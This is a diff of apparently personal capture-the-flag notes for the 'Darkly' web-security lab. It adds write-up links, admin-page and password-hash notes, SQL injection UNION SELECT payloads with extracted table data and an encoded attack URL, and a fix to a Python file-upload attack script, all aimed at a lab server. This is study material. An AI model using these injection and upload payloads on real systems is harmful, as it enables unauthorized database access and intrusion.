@@ -20,6 +20,14 @@ Flags:
 14. nsa2
 
 
+Darkly writeups github:
+1. https://github.com/acarlson99/darkly
+2. https://github.com/bnoufel/Darkly
+3. https://github.com/asarandi/darkly
+4. https://github.com/tillderoquefeuil-42-web/darkly
+5. https://github.com/acarlson99/darkly
+
+
 
 # Bruteforce/Flag01
 
@@ -98,6 +106,16 @@ explorer.exe .			#åpner directory i file explorer windows
 
 # Flag08
 
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890
+http://129.241.200.165:19680/whatever/
+htpasswd:
+	root:sha256('eirikgbaPutHereSomeExtraChars')=........................................................xxxxxxxx
+	xxxxxxxx = Rightmost 8 chars of <Traversal of .hidden folder Flag07>
+
+http://129.241.200.165:19680/admin/index.php
+
+
+
 # Flag09 - cookie
 satoshi 65558: 22c9b7866d7424dc4b90a03664f5136c966fb34c8edd751cfba6998fe2b5170f
 ```
@@ -162,14 +180,44 @@ https://onlinehextools.com/xor-hex-numbers
 ```
 
 # Flag11
+ID: 1=1 UNION SELECT comment12, titlec4 FROM images 
+Title: saepe
+Url : To find Flag11, use 16 leftmost characters of the Cookie Tampering Flag09 and download the file 3d8e5368ff73ab88cdccd05a07e1e19e.bin
+
+http://129.241.200.165:19680/?page=searchimg
+	glb eller gltf binary fil?
+
+```
+1=1 UNION SELECT table_schema, table_name FROM information_schema.tables
+1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+1=1 UNION SELECT CONCAT(downloads66, comment12, id43, urlef), titlec4 FROM images	
+	#id=17655
+	#download=5626031
+	#title: saepe
+	#url: http://mosciski.biz/someplace.jpg 
+	#flag09: 07580b873bc9eb153f4f346c415421e1
+	#16 leftmost char of Flag09: 07580b873bc9eb15
+1=1 UNION SELECT id, url FROM list_images
+
+http://129.241.200.165:19680/index.php?page=searchimg&id=1%3D1+UNION+SELECT+CONCAT%28downloads66%2C+comment12%2C+id43%2C+urlef%29%2C+titlec4+FROM+images&Submit=Submit#
+http://129.241.200.165:19680/index.php?page=download
+
+```
+
 
 # Flag12 - image upload
+http://129.241.200.165:19680/?page=upload# 
+
+Nice try but should be the image name extracted from SEARCH IMAGE attack
+		saepe ?
+		3d8e5368ff73ab88cdccd05a07e1e19e.bin ?
+
 ```
 #!/usr/bin/env python3
 
 import requests
 
-url = 'http://129.241.200.165:19680//?page=upload'
+url = 'http://129.241.200.165:19680/?page=upload'
 
 f = {
         'uploaded':                                 # .. from <form> element in html
